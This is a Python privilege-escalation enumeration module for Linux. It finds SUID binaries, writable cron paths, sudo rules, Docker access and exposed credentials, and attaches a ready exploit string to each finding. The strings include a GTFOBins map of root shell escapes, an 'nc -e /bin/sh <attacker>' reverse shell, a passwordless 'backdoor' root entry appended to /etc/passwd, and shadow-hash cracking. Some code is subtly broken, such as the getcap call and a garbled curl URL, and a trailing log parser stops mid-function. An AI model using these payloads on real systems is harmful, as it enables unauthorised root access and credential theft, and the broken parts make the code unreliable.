#!/usr/bin/env python3
"""
Privilege Escalation Enumeration Module
Synthesized from: Hacking: The Art of Exploitation, Linux Privilege Escalation guides

Enumerate common privilege escalation vectors.
"""

import os
import re
import subprocess
import platform as _platform
from pathlib import Path
import stat

_IS_MACOS = _platform.system() == 'Darwin'
_IS_LINUX = _platform.system() == 'Linux'

class PrivescEnumerator:
    """Enumerate privilege escalation paths"""
    
    def __init__(self):
        self.findings = []
        self.user = os.getenv('USER', 'unknown')
        self.uid = os.getuid()
        self.gid = os.getgid()
    
    def enumerate_all(self):
        """Run all enumeration checks"""
        self.check_suid_binaries()
        self.scan_suid_binaries()
        self.check_writable_paths()
        self.check_sudo_access()
        self.check_cron_jobs()
        self.check_world_writable_cron()
        self.check_capabilities()
        self.check_linux_capabilities()
        self.check_docker_group()
        self.check_docker_socket()
        self.check_kernel_exploits()
        self.check_passwd_writable()
        self.check_sudo_nopasswd()
        self.check_readable_shadow_or_backup_passwd()
        self.check_package_manager_attack_surface()
        self.check_debug_flags_in_env()

        return self.findings
    
    def check_suid_binaries(self):
        """Find SUID/SGID binaries"""
        common_paths = ['/bin', '/sbin', '/usr/bin', '/usr/sbin', '/usr/local/bin']
        
        suid_bins = []
        
        for base in common_paths:
            try:
                for entry in Path(base).rglob('*'):
                    if entry.is_file():
                        st = entry.stat()
                        mode = st.st_mode
                        
                        # Check SUID (4000) or SGID (2000)
                        if mode & stat.S_ISUID or mode & stat.S_ISGID:
                            suid_bins.append({
                                'path': str(entry),
                                'mode': oct(mode),
                                'owner': st.st_uid,
                                'suid': bool(mode & stat.S_ISUID),
                                'sgid': bool(mode & stat.S_ISGID)
                            })
            except:
                pass
        
        if suid_bins:
            self.findings.append({
                'category': 'SUID/SGID Binaries',
                'severity': 'MEDIUM',
                'count': len(suid_bins),
                'items': suid_bins[:20],  # Top 20
                'description': f'Found {len(suid_bins)} SUID/SGID binaries',
                'exploit': 'Check GTFOBins for known SUID exploits'
            })
    
    def check_writable_paths(self):
        """Check for writable directories in PATH and common locations"""
        writable = []
        
        # Check PATH directories
        path_dirs = os.environ.get('PATH', '').split(':')
        for dir_path in path_dirs:
            p = Path(dir_path)
            if p.exists() and p.is_dir():
                st = p.stat()
                mode = st.st_mode
                
                # World-writable or group-writable
                if mode & stat.S_IWOTH or (mode & stat.S_IWGRP and st.st_gid == self.gid):
                    writable.append({
                        'path': str(p),
                        'type': 'PATH directory',
                        'mode': oct(mode),
                        'world_writable': bool(mode & stat.S_IWOTH)
                    })
        
        # Check common script locations
        script_dirs = ['/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly', 
                      '/etc/init.d', '/etc/systemd/system']
        
        for dir_path in script_dirs:
            p = Path(dir_path)
            if p.exists():
                st = p.stat()
                mode = st.st_mode
                
                if mode & stat.S_IWOTH or (mode & stat.S_IWGRP and st.st_gid == self.gid):
                    writable.append({
                        'path': str(p),
                        'type': 'Script directory',
                        'mode': oct(mode),
                        'world_writable': bool(mode & stat.S_IWOTH)
                    })
        
        if writable:
            self.findings.append({
                'category': 'Writable Paths',
                'severity': 'HIGH',
                'count': len(writable),
                'items': writable,
                'description': f'Found {len(writable)} writable paths',
                'exploit': 'Place malicious binaries in writable PATH directories'
            })
    
    def check_sudo_access(self):
        """Check sudo privileges"""
        try:
            result = subprocess.run(
                ['sudo', '-l', '-n'],  # -n = non-interactive
                capture_output=True,
                text=True,
                timeout=2
            )
            
            if result.returncode == 0:
                sudo_info = {
                    'has_sudo': True,
                    'output': result.stdout
                }
                
                # Check for dangerous sudo rules
                dangerous = []
                if 'ALL' in result.stdout:
                    dangerous.append('ALL command access')
                if 'NOPASSWD' in result.stdout:
                    dangerous.append('Password-less sudo')
                
                self.findings.append({
                    'category': 'Sudo Access',
                    'severity': 'CRITICAL' if dangerous else 'HIGH',
                    'items': dangerous,
                    'description': f'User has sudo privileges',
                    'exploit': 'Execute privileged commands via sudo'
                })
        except:
            pass
    
    def check_cron_jobs(self):
        """Check for writable cron jobs"""
        cron_files = []
        
        # User crontab
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            if result.returncode == 0:
                cron_files.append({
                    'type': 'User crontab',
                    'path': f'/var/spool/cron/crontabs/{self.user}',
                    'writable': True
                })
        except:
            pass
        
        # System cron directories
        cron_dirs = ['/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly', 
                    '/etc/cron.weekly', '/etc/cron.monthly']
        
        for dir_path in cron_dirs:
            p = Path(dir_path)
            if p.exists():
                try:
                    for entry in p.iterdir():
                        if entry.is_file():
                            st = entry.stat()
                            mode = st.st_mode
                            
                            # Check if writable
                            if mode & stat.S_IWOTH or (mode & stat.S_IWGRP and st.st_gid == self.gid):
                                cron_files.append({
                                    'type': 'System cron job',
                                    'path': str(entry),
                                    'mode': oct(mode),
                                    'writable': True
                                })
                except:
                    pass
        
        if cron_files:
            self.findings.append({
                'category': 'Writable Cron Jobs',
                'severity': 'HIGH',
                'count': len(cron_files),
                'items': cron_files,
                'description': f'Found {len(cron_files)} writable cron jobs',
                'exploit': 'Modify cron job to execute commands as privileged user'
            })
    
    def check_capabilities(self):
        """Check for binaries with dangerous capabilities"""
        try:
            result = subprocess.run(
                ['getcap', '-r', '/', '2>/dev/null'],
                capture_output=True,
                text=True,
                shell=True,
                timeout=10
            )
            
            if result.stdout:
                caps = []
                dangerous_caps = ['cap_setuid', 'cap_setgid', 'cap_dac_override', 'cap_sys_admin']
                
                for line in result.stdout.split('\n'):
                    if '=' in line:
                        path, cap_str = line.split('=', 1)
                        path = path.strip()
                        
                        # Check for dangerous caps
                        if any(cap in cap_str.lower() for cap in dangerous_caps):
                            caps.append({
                                'path': path,
                                'capabilities': cap_str.strip(),
                                'dangerous': True
                            })
                
                if caps:
                    self.findings.append({
                        'category': 'Dangerous Capabilities',
                        'severity': 'HIGH',
                        'count': len(caps),
                        'items': caps,
                        'description': f'Found {len(caps)} binaries with dangerous capabilities',
                        'exploit': 'Use capability-enabled binaries for privilege escalation'
                    })
        except:
            pass
    
    def check_docker_group(self):
        """Check if user is in docker group"""
        try:
            import grp
            groups = [grp.getgrgid(g).gr_name for g in os.getgroups()]
            
            if 'docker' in groups:
                self.findings.append({
                    'category': 'Docker Group Membership',
                    'severity': 'CRITICAL',
                    'description': 'User is in docker group',
                    'exploit': 'Mount host filesystem in container: docker run -v /:/host -it alpine chroot /host',
                    'items': [{'group': 'docker', 'gid': grp.getgrnam('docker').gr_gid}]
                })
        except:
            pass
    
    def check_kernel_exploits(self):
        """Check kernel version for known exploits"""
        kernel_version = None
        try:
            if _IS_MACOS:
                result = subprocess.run(['uname', '-r'], capture_output=True, text=True, timeout=2)
                kernel_version = f'Darwin {result.stdout.strip()}'
            else:
                with open('/proc/version') as f:
                    kernel_version = f.read().strip()
        except:
            try:
                result = subprocess.run(['uname', '-r'], capture_output=True, text=True, timeout=2)
                kernel_version = result.stdout.strip()
            except:
                pass

        if not kernel_version:
            return

        try:
            # Extract version number
            import re
            match = re.search(r'Linux version (\d+\.\d+\.\d+)', kernel_version)
            if match:
                version = match.group(1)
                
                # Check against known vulnerable versions (simplified)
                vulnerable = False
                exploit_name = None
                
                # DirtyPipe (5.8 - 5.16.11)
                if version.startswith('5.') and int(version.split('.')[1]) in range(8, 17):
                    vulnerable = True
                    exploit_name = 'DirtyPipe (CVE-2022-0847)'
                
                if vulnerable:
                    self.findings.append({
                        'category': 'Kernel Exploit',
                        'severity': 'CRITICAL',
                        'description': f'Kernel may be vulnerable to {exploit_name}',
                        'items': [{'version': version, 'exploit': exploit_name}],
                        'exploit': f'Search for {exploit_name} exploit code'
                    })
        except:
            pass
    
    # GTFOBins SUID escape map — binary name -> technique summary
    _GTFOBINS = {
        'cp':     'overwrite /etc/passwd or /etc/shadow',
        'find':   'find . -exec /bin/sh -p \\; -quit',
        'nmap':   'nmap --interactive -> !sh  (old nmap)',
        'vim':    'vim -c ":py import os; os.execl(\\"/bin/sh\\", \\"sh\\", \\"-p\\")"',
        'python': 'python -c "import os; os.execl(\\"/bin/sh\\", \\"sh\\", \\"-p\\")"',
        'python3':'python3 -c "import os; os.execl(\\"/bin/sh\\", \\"sh\\", \\"-p\\")"',
        'perl':   'perl -e "exec \\"/bin/sh -p\\""',
        'ruby':   'ruby -e "exec \\"/bin/sh -p\\""',
        'bash':   'bash -p',
        'less':   'less /etc/passwd -> !/bin/sh',
        'more':   'more /etc/passwd -> !/bin/sh',
        'awk':    "awk 'BEGIN {system(\"/bin/sh -p\")}'",
        'man':    'man man -> !/bin/sh',
        'env':    'env /bin/sh -p',
        'ftp':    'ftp -> !/bin/sh',
        'git':    'git help config -> !/bin/sh',
        'nc':     'nc -e /bin/sh <attacker> <port>',
        'ncat':   'ncat -e /bin/sh <attacker> <port>',
        'screen': 'screen -> Ctrl-A :exec sh',
        'socat':  'socat stdin exec:/bin/sh',
        'tee':    'echo "user::0:0:root:/root:/bin/bash" | tee -a /etc/passwd',
        'wget':   'wget <url> -O /etc/cron.d/backdoor',
        'zip':    "zip /tmp/x.zip /etc/passwd -T --unzip-command 'sh -p'",
    }

    def scan_suid_binaries(self) -> list:
        """Full-system SUID scan with GTFOBins cross-reference.

        Runs find(1) across the filesystem and cross-references each hit
        against the GTFOBins list.  Returns list of dicts; also appends
        to self.findings for any dangerous hits.
        """
        results = []
        try:
            proc = subprocess.run(
                ['find', '/', '-perm', '-4000', '-type', 'f'],
                capture_output=True,
                text=True,
                timeout=30,
            )
            paths = [p.strip() for p in proc.stdout.splitlines() if p.strip()]
        except Exception:
            paths = []

        for p in paths:
            name = os.path.basename(p).lower()
            # strip version suffixes: python3.9 -> python3
            base = re.sub(r'[\d.]+$', '', name)
            match_key = None
            for key in self._GTFOBINS:
                if name == key or base == key or name.startswith(key):
                    match_key = key
                    break
            results.append({
                'path': p,
                'gtfobins': match_key is not None,
                'escape_technique': self._GTFOBINS.get(match_key, '') if match_key else '',
            })

        dangerous = [r for r in results if r['gtfobins']]
        if dangerous:
            self.findings.append({
                'category': 'SUID GTFOBins',
                'severity': 'HIGH',
                'count': len(dangerous),
                'items': dangerous,
                'description': f'{len(dangerous)} SUID binaries in GTFOBins list',
                'exploit': 'Use listed escape techniques for shell as file owner',
            })
        return results

    def check_linux_capabilities(self) -> list:
        """Read /proc/<pid>/status for dangerous Linux capabilities.

        Checks CapEff hex field for known dangerous capability bits:
          CAP_DAC_READ_SEARCH  0x4       -- read any file
          CAP_NET_RAW          0x2000    -- raw sockets / ARP poison
          CAP_SYS_PTRACE       0x400000  -- attach to any process
          CAP_SYS_ADMIN        0x200000  -- broad kernel operations

        Returns list of {'pid': int, 'caps': list[str], 'dangerous': bool}.
        """
        _DANGEROUS = {
            'CAP_DAC_READ_SEARCH': 0x4,
            'CAP_NET_RAW':         0x2000,
            'CAP_SYS_PTRACE':      0x400000,
            'CAP_SYS_ADMIN':       0x200000,
        }

        results = []
        try:
            pids = [int(p) for p in os.listdir('/proc') if p.isdigit()]
        except Exception:
            return results

        for pid in pids:
            status_path = f'/proc/{pid}/status'
            try:
                with open(status_path) as fh:
                    content = fh.read()
            except Exception:
                continue

            m = re.search(r'CapEff:\s+([0-9a-fA-F]+)', content)
            if not m:
                continue

            cap_eff = int(m.group(1), 16)
            active_caps = [name for name, bit in _DANGEROUS.items() if cap_eff & bit]
            dangerous = bool(active_caps)
            results.append({
                'pid': pid,
                'caps': active_caps,
                'dangerous': dangerous,
            })

        flagged = [r for r in results if r['dangerous']]
        if flagged:
            self.findings.append({
                'category': 'Dangerous Process Capabilities',
                'severity': 'HIGH',
                'count': len(flagged),
                'items': flagged[:20],
                'description': f'{len(flagged)} processes with dangerous Linux capabilities',
                'exploit': 'Exploit via ptrace attach, raw socket injection, or admin escalation',
            })
        return results

    def check_world_writable_cron(self) -> list:
        """Check cron directories and files for world/group writability via os.access().

        Covers: /etc/cron.d/, /etc/cron.daily/, /etc/cron.hourly/, /var/spool/cron/

        Returns list of {'path': str, 'writable': bool}.
        """
        cron_dirs = [
            '/etc/cron.d',
            '/etc/cron.daily',
            '/etc/cron.hourly',
            '/etc/cron.weekly',
            '/etc/cron.monthly',
            '/var/spool/cron',
        ]
        results = []
        for dir_path in cron_dirs:
            p = Path(dir_path)
            if not p.exists():
                continue
            # Check directory itself
            writable = os.access(dir_path, os.W_OK)
            results.append({'path': dir_path, 'writable': writable})
            # Check individual files
            try:
                for entry in p.iterdir():
                    if entry.is_file():
                        w = os.access(str(entry), os.W_OK)
                        results.append({'path': str(entry), 'writable': w})
            except Exception:
                pass

        writable_items = [r for r in results if r['writable']]
        if writable_items:
            self.findings.append({
                'category': 'Writable Cron Paths',
                'severity': 'HIGH',
                'count': len(writable_items),
                'items': writable_items,
                'description': f'{len(writable_items)} writable cron files/directories',
                'exploit': 'Write reverse shell into cron job; executes as root on next tick',
            })
        return results

    def check_passwd_writable(self) -> dict:
        """Check writability of /etc/passwd and readability of /etc/shadow.

        Returns {'passwd_writable': bool, 'shadow_readable': bool}.
        """
        passwd_writable = os.access('/etc/passwd', os.W_OK)
        shadow_readable = os.access('/etc/shadow', os.R_OK)

        result = {
            'passwd_writable': passwd_writable,
            'shadow_readable': shadow_readable,
        }

        if passwd_writable:
            self.findings.append({
                'category': 'Writable /etc/passwd',
                'severity': 'CRITICAL',
                'description': '/etc/passwd is writable — add rootless user entry',
                'exploit': 'echo "backdoor::0:0:root:/root:/bin/bash" >> /etc/passwd',
                'items': [result],
            })
        if shadow_readable:
            self.findings.append({
                'category': 'Readable /etc/shadow',
                'severity': 'CRITICAL',
                'description': '/etc/shadow is readable — extract password hashes',
                'exploit': 'cat /etc/shadow | hashcat -m 1800',
                'items': [result],
            })
        return result

    def check_docker_socket(self) -> dict:
        """Check if /var/run/docker.sock is accessible.

        Returns {'docker_socket_accessible': bool, 'path': str}.
        """
        sock_path = '/var/run/docker.sock'
        accessible = os.path.exists(sock_path) and os.access(sock_path, os.R_OK)
        result = {'docker_socket_accessible': accessible, 'path': sock_path}

        if accessible:
            self.findings.append({
                'category': 'Docker Socket Access',
                'severity': 'CRITICAL',
                'description': '/var/run/docker.sock accessible — container escape to root',
                'exploit': (
                    'docker run -v /:/host -it alpine chroot /host /bin/bash  '
                    '(or: curl --unix-socket /var/run/docker.sock http./containers/json)'
                ),
                'items': [result],
            })
        return result

    def check_sudo_nopasswd(self) -> list:
        """Parse /etc/sudoers and /etc/sudoers.d/* for NOPASSWD entries.

        ALL=(ALL) NOPASSWD:ALL = CRITICAL
        Any NOPASSWD line = HIGH
        Specific binary grants extracted and listed.
        Returns list of finding dicts; also appends to self.findings.
        """
        sudoers_files = []
        try:
            if os.path.isfile('/etc/sudoers'):
                sudoers_files.append('/etc/sudoers')
        except Exception:
            pass
        sudoers_d = '/etc/sudoers.d'
        try:
            if os.path.isdir(sudoers_d):
                for entry in os.listdir(sudoers_d):
                    fp = os.path.join(sudoers_d, entry)
                    if os.path.isfile(fp):
                        sudoers_files.append(fp)
        except Exception:
            pass

        results = []
        for sf in sudoers_files:
            try:
                with open(sf) as fh:
                    content = fh.read()
            except PermissionError:
                continue
            except Exception:
                continue

            for lineno, line in enumerate(content.splitlines(), 1):
                stripped = line.strip()
                if stripped.startswith('#') or not stripped:
                    continue
                if 'NOPASSWD' not in stripped:
                    continue

                # Classify severity
                if re.search(r'ALL\s*=\s*\(ALL\)', stripped, re.IGNORECASE) and \
                        re.search(r'NOPASSWD\s*:\s*ALL', stripped, re.IGNORECASE):
                    severity = 'CRITICAL'
                    note = 'Unrestricted passwordless sudo'
                else:
                    severity = 'HIGH'
                    note = 'Passwordless sudo for specific command(s)'

                # Extract binary paths from rule
                bins = re.findall(r'NOPASSWD\s*:\s*([^\s,]+(?:\s*,\s*[^\s,]+)*)', stripped, re.IGNORECASE)
                extracted_bins = []
                for b in bins:
                    extracted_bins.extend([x.strip() for x in b.split(',')])

                results.append({
                    'file': sf,
                    'line': lineno,
                    'rule': stripped,
                    'severity': severity,
                    'note': note,
                    'binaries': extracted_bins,
                })

        critical = [r for r in results if r['severity'] == 'CRITICAL']
        high = [r for r in results if r['severity'] == 'HIGH']

        if critical:
            self.findings.append({
                'category': 'Sudo NOPASSWD Unrestricted',
                'severity': 'CRITICAL',
                'count': len(critical),
                'items': critical,
                'description': f'{len(critical)} ALL=(ALL) NOPASSWD:ALL rule(s) in sudoers',
                'exploit': 'sudo su - or sudo /bin/bash for immediate root shell',
            })
        if high:
            self.findings.append({
                'category': 'Sudo NOPASSWD Scoped',
                'severity': 'HIGH',
                'count': len(high),
                'items': high,
                'description': f'{len(high)} NOPASSWD rule(s) granting passwordless sudo to specific binaries',
                'exploit': 'Check GTFOBins for the listed binaries; many allow shell escape',
            })
        return results

    def check_readable_shadow_or_backup_passwd(self) -> list:
        """Check readability of backup credential files, history files, and /proc/1/environ.

        Targets:
          /etc/shadow.bak, /etc/passwd.bak, /etc/passwd-, /etc/shadow-  -> HIGH
          /root/.bash_history, /home/*/.bash_history                     -> HIGH (command history)
          /proc/1/environ                                                  -> HIGH (init secrets)
        Returns list of readable path dicts; appends to self.findings.
        """
        targets = [
            '/etc/shadow.bak',
            '/etc/passwd.bak',
            '/etc/passwd-',
            '/etc/shadow-',
            '/root/.bash_history',
            '/proc/1/environ',
        ]

        # Expand /home/*/.bash_history
        try:
            home_dir = Path('/home')
            if home_dir.is_dir():
                for user_dir in home_dir.iterdir():
                    hist = user_dir / '.bash_history'
                    if str(hist) not in targets:
                        targets.append(str(hist))
        except Exception:
            pass

        results = []
        for path in targets:
            try:
                readable = os.access(path, os.R_OK) and os.path.exists(path)
            except Exception:
                continue
            if not readable:
                continue
            # Only flag if we are not root (uid != 0); root reading these is expected
            if self.uid == 0:
                continue

            if 'shadow' in path or 'passwd' in path:
                note = 'Backup credential file readable — may contain password hashes'
                severity = 'HIGH'
            elif 'bash_history' in path:
                note = 'Shell history readable — may contain cleartext credentials or sudo commands'
                severity = 'HIGH'
            elif 'environ' in path:
                note = '/proc/1/environ readable — init process environment may contain secrets'
                severity = 'HIGH'
            else:
                note = 'Sensitive file readable'
                severity = 'HIGH'

            results.append({
                'path': path,
                'readable': True,
                'severity': severity,
                'note': note,
            })

        if results:
            self.findings.append({
                'category': 'Readable Sensitive Credential Files',
                'severity': 'HIGH',
                'count': len(results),
                'items': results,
                'description': f'{len(results)} sensitive credential/history file(s) readable by non-root user',
                'exploit': 'Extract password hashes, history credentials, or env secrets for lateral movement',
            })
        return results

    def check_package_manager_attack_surface(self) -> list:
        """Check package manager configs for supply-chain weaknesses.

        APT: http:// repos in sources.list / sources.list.d/*  -> MEDIUM
        pip: --trusted-host or http:// index-url               -> HIGH
        YUM: gpgcheck=0 in /etc/yum.repos.d/*.repo             -> HIGH
        npm: registry=http:// in ~/.npmrc                      -> MEDIUM
        Returns list of issue dicts; appends to self.findings.
        """
        results = []

        # --- APT ---
        apt_files = []
        if os.path.isfile('/etc/apt/sources.list'):
            apt_files.append('/etc/apt/sources.list')
        apt_d = '/etc/apt/sources.list.d'
        if os.path.isdir(apt_d):
            try:
                for f in os.listdir(apt_d):
                    fp = os.path.join(apt_d, f)
                    if os.path.isfile(fp):
                        apt_files.append(fp)
            except Exception:
                pass

        for af in apt_files:
            try:
                with open(af) as fh:
                    for lineno, line in enumerate(fh, 1):
                        stripped = line.strip()
                        if stripped.startswith('#') or not stripped:
                            continue
                        if re.search(r'\bhttp://', stripped):
                            results.append({
                                'manager': 'APT',
                                'file': af,
                                'line': lineno,
                                'issue': 'Insecure APT repository (http:// — no TLS)',
                                'severity': 'MEDIUM',
                                'snippet': stripped[:120],
                            })
            except Exception:
                pass

        # --- pip ---
        pip_files = [
            os.path.expanduser('~/.pip/pip.conf'),
            '/etc/pip.conf',
            os.path.expanduser('~/.config/pip/pip.conf'),
        ]
        for pf in pip_files:
            if not os.path.isfile(pf):
                continue
            try:
                with open(pf) as fh:
                    content = fh.read()
                for lineno, line in enumerate(content.splitlines(), 1):
                    stripped = line.strip()
                    if re.search(r'trusted-host', stripped, re.IGNORECASE):
                        results.append({
                            'manager': 'pip',
                            'file': pf,
                            'line': lineno,
                            'issue': 'pip trusted-host bypasses TLS verification',
                            'severity': 'HIGH',
                            'snippet': stripped[:120],
                        })
                    if re.search(r'index-url\s*=\s*http://', stripped, re.IGNORECASE):
                        results.append({
                            'manager': 'pip',
                            'file': pf,
                            'line': lineno,
                            'issue': 'Insecure pip index-url (http:// — MITM / package substitution)',
                            'severity': 'HIGH',
                            'snippet': stripped[:120],
                        })
            except Exception:
                pass

        # --- YUM / DNF ---
        yum_d = '/etc/yum.repos.d'
        if os.path.isdir(yum_d):
            try:
                for fname in os.listdir(yum_d):
                    if not fname.endswith('.repo'):
                        continue
                    fp = os.path.join(yum_d, fname)
                    try:
                        with open(fp) as fh:
                            for lineno, line in enumerate(fh, 1):
                                stripped = line.strip()
                                if re.match(r'gpgcheck\s*=\s*0', stripped, re.IGNORECASE):
                                    results.append({
                                        'manager': 'YUM/DNF',
                                        'file': fp,
                                        'line': lineno,
                                        'issue': 'GPG check disabled — unsigned packages will install silently',
                                        'severity': 'HIGH',
                                        'snippet': stripped[:120],
                                    })
                    except Exception:
                        pass
            except Exception:
                pass

        # --- npm ---
        npmrc = os.path.expanduser('~/.npmrc')
        if os.path.isfile(npmrc):
            try:
                with open(npmrc) as fh:
                    for lineno, line in enumerate(fh, 1):
                        stripped = line.strip()
                        if re.search(r'registry\s*=\s*http://', stripped, re.IGNORECASE):
                            results.append({
                                'manager': 'npm',
                                'file': npmrc,
                                'line': lineno,
                                'issue': 'Insecure npm registry (http:// — MITM / package substitution)',
                                'severity': 'MEDIUM',
                                'snippet': stripped[:120],
                            })
            except Exception:
                pass

        high = [r for r in results if r['severity'] == 'HIGH']
        medium = [r for r in results if r['severity'] == 'MEDIUM']

        if high:
            self.findings.append({
                'category': 'Package Manager Supply Chain — High',
                'severity': 'HIGH',
                'count': len(high),
                'items': high,
                'description': (
                    f'{len(high)} high-severity package manager config issue(s): '
                    'GPG disabled or insecure pip index (MITM / unsigned package risk)'
                ),
                'exploit': 'MITM the http:// channel or substitute a malicious package; '
                           'installs as root during unattended-upgrade or pip install',
            })
        if medium:
            self.findings.append({
                'category': 'Package Manager Supply Chain — Medium',
                'severity': 'MEDIUM',
                'count': len(medium),
                'items': medium,
                'description': (
                    f'{len(medium)} medium-severity package manager config issue(s): '
                    'insecure APT or npm registry over http://'
                ),
                'exploit': 'MITM downgrade or inject malicious package into unencrypted repo channel',
            })
        return results

    def check_debug_flags_in_env(self) -> list:
        """Scan /proc/*/environ for debug flags and credential env vars.

        Debug indicators (MEDIUM): DEBUG=1/true, FLASK_ENV=development,
          RAILS_ENV=development, NODE_ENV=development,
          JAVA_OPTS containing -Xdebug or -agentlib:jdwp
        Credential indicators (CRITICAL): PASSWORD=, SECRET=, TOKEN=, API_KEY=

        Skips unreadable process environs gracefully.
        Returns list of finding dicts; appends to self.findings.
        """
        _DEBUG_PATTERNS = [
            (re.compile(r'\bDEBUG=(1|true|yes)', re.IGNORECASE), 'DEBUG mode enabled'),
            (re.compile(r'\bFLASK_ENV=development', re.IGNORECASE), 'Flask running in development mode'),
            (re.compile(r'\bRAILS_ENV=development', re.IGNORECASE), 'Rails running in development mode'),
            (re.compile(r'\bNODE_ENV=development', re.IGNORECASE), 'Node.js running in development mode'),
            (re.compile(r'\bJAVA_OPTS=[^\x00]*(-Xdebug|-agentlib:jdwp)', re.IGNORECASE),
             'JVM debug agent active (JDWP)'),
        ]
        _CRED_PATTERNS = [
            re.compile(r'\b(PASSWORD|SECRET|TOKEN|API_KEY)=[^\x00]{1,256}', re.IGNORECASE),
        ]

        debug_hits = []
        cred_hits = []

        try:
            proc_dirs = [d for d in os.listdir('/proc') if d.isdigit()]
        except Exception:
            return []

        for pid_str in proc_dirs:
            environ_path = f'/proc/{pid_str}/environ'
            try:
                with open(environ_path, 'rb') as fh:
                    raw = fh.read(65536)  # cap at 64 KB per process
            except (PermissionError, FileNotFoundError, ProcessLookupError):
                continue
            except Exception:
                continue

            # environ is NUL-separated key=value pairs
            try:
                env_str = raw.decode('utf-8', errors='replace')
            except Exception:
                continue

            # Replace NUL with newline for regex scanning
            env_text = env_str.replace('\x00', '\n')

            for pattern, label in _DEBUG_PATTERNS:
                if pattern.search(env_text):
                    debug_hits.append({
                        'pid': int(pid_str),
                        'indicator': label,
                        'severity': 'MEDIUM',
                    })
                    break  # one debug hit per pid is enough

            for pattern in _CRED_PATTERNS:
                m = pattern.search(env_text)
                if m:
                    # Redact value beyond first 4 chars to avoid logging secrets verbatim
                    raw_match = m.group(0)
                    eq_idx = raw_match.index('=')
                    key = raw_match[:eq_idx]
                    val_preview = raw_match[eq_idx + 1: eq_idx + 5] + '****'
                    cred_hits.append({
                        'pid': int(pid_str),
                        'key': key,
                        'value_preview': val_preview,
                        'severity': 'CRITICAL',
                    })

        if cred_hits:
            self.findings.append({
                'category': 'Credential in Process Environment',
                'severity': 'CRITICAL',
                'count': len(cred_hits),
                'items': cred_hits[:20],
                'description': (
                    f'{len(cred_hits)} process(es) expose credential env vars '
                    '(PASSWORD/SECRET/TOKEN/API_KEY) in /proc/*/environ'
                ),
                'exploit': (
                    'cat /proc/<pid>/environ | tr "\\0" "\\n" | grep -E '
                    '"PASSWORD|SECRET|TOKEN|API_KEY" — readable by any user who can open the file'
                ),
            })
        if debug_hits:
            self.findings.append({
                'category': 'Debug Mode Active in Running Process',
                'severity': 'MEDIUM',
                'count': len(debug_hits),
                'items': debug_hits[:20],
                'description': (
                    f'{len(debug_hits)} process(es) running with debug flags enabled '
                    '(Flask/Rails/Node development mode, JVM JDWP agent, or DEBUG=1)'
                ),
                'exploit': (
                    'Development mode disables auth checks, enables verbose tracebacks, '
                    'and exposes debug endpoints (e.g. Flask debugger PIN bypass, JDWP RCE)'
                ),
            })
        return debug_hits + cred_hits

    def report(self):
        """Generate human-readable report"""
        lines = []
        lines.append("="*60)
        lines.append("PRIVILEGE ESCALATION ENUMERATION")
        lines.append("="*60)
        lines.append(f"User: {self.user} (UID {self.uid})")
        lines.append(f"Total findings: {len(self.findings)}\n")
        
        # Sort by severity
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        sorted_findings = sorted(self.findings, key=lambda x: severity_order.get(x['severity'], 4))
        
        for finding in sorted_findings:
            lines.append(f"[{finding['severity']}] {finding['category']}")
            lines.append(f"  {finding['description']}")
            if 'exploit' in finding:
                lines.append(f"  Exploit: {finding['exploit']}")
            
            # Show some items
            if 'items' in finding and finding['items']:
                lines.append(f"  Items ({min(len(finding['items']), 5)} of {len(finding['items'])}):")
                for item in finding['items'][:5]:
                    if isinstance(item, dict):
                        if 'path' in item:
                            lines.append(f"    - {item['path']}")
                        elif 'group' in item:
                            lines.append(f"    - {item['group']}")
                    else:
                        lines.append(f"    - {item}")
            lines.append("")
        
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# Standalone live-system investigation functions (no class required)
# Synthesized from: Blue Team Handbook — Chapter 6 (Linux Volatile Data),
#                   Chapter 4 (Adversary Tools & Tactics)
# ---------------------------------------------------------------------------

import struct as _struct
import hashlib as _hashlib
import ipaddress as _ipaddress


def check_wtmp_utmp_anomalies() -> list:
    """Parse /var/log/wtmp and /var/run/utmp for authentication anomalies.

    utmp struct layout (Linux, 384-byte record):
        hi32s4s32s256shhiii4i
        h   ut_type        (short)
        i   ut_pid         (int)
        32s ut_line        (tty)
        4s  ut_id
        32s ut_user
        256s ut_host
        hh  exit status
        iii session / tv_sec / tv_usec
        4i  ut_addr_v6

    Findings:
        HIGH   ROOT_REMOTE_LOGIN          uid-0 login from pts/*
        MEDIUM REMOTE_LOGIN_FROM_PUBLIC_IP login from non-RFC1918 host
        LOW    REPEATED_DEAD_PROCESS      unusual dead-process bursts
    """
    _FMT = "hi32s4s32s256shhiii4i"
    _SZ = _struct.calcsize(_FMT)

    _RFC1918 = [
        _ipaddress.ip_network("10.0.0.0/8"),
        _ipaddress.ip_network("172.16.0.0/12"),
        _ipaddress.ip_network("192.168.0.0/16"),
        _ipaddress.ip_network("127.0.0.0/8"),
        _ipaddress.ip_network("169.254.0.0/16"),
    ]

    def _is_public_ip(host: str) -> bool:
        host = host.strip()
        if not host:
            return False
        try:
            addr = _ipaddress.ip_address(host)
            return not any(addr in net for net in _RFC1918)
        except ValueError:
            return False

    findings = []

    for log_path in ("/var/log/wtmp", "/var/run/utmp"):
        try:
            with open(log_path, "rb") as fh:
                data = fh.read()
        except (PermissionError, FileNotFoundError, OSError):
            continue

        dead_count = 0
        for offset in range(0, len(data) - _SZ + 1, _SZ):
            chunk = data[offset: offset + _SZ]
            if len(chunk) < _SZ:
                break
            try:
                fields = _struct.unpack(_FMT, chunk)
            except _struct.error:
                continue

            ut_type = fields[0]
            ut_line = fields[2].rstrip(b"\x00").decode("utf-8", errors="replace")
            ut_user = fields[4].rstrip(b"\x00").decode("utf-8", errors="replace")
            ut_host = fields[5].rstrip(b"\x00").decode("utf-8", errors="replace")

            # type=7 = USER_PROCESS (active login)
            if ut_type == 7:
                if ut_user == "root" and ut_line.startswith("pts/"):
                    findings.append({
                        "severity": "HIGH",
                        "title": "ROOT_REMOTE_LOGIN",
                        "detail": (
                            f"{log_path}: root login on {ut_line} "
                            f"from host '{ut_host}'"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })

                if _is_public_ip(ut_host):
                    findings.append({
                        "severity": "MEDIUM",
                        "title": "REMOTE_LOGIN_FROM_PUBLIC_IP",
                        "detail": (
                            f"{log_path}: user '{ut_user}' logged in "
                            f"from public IP {ut_host} on {ut_line}"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })

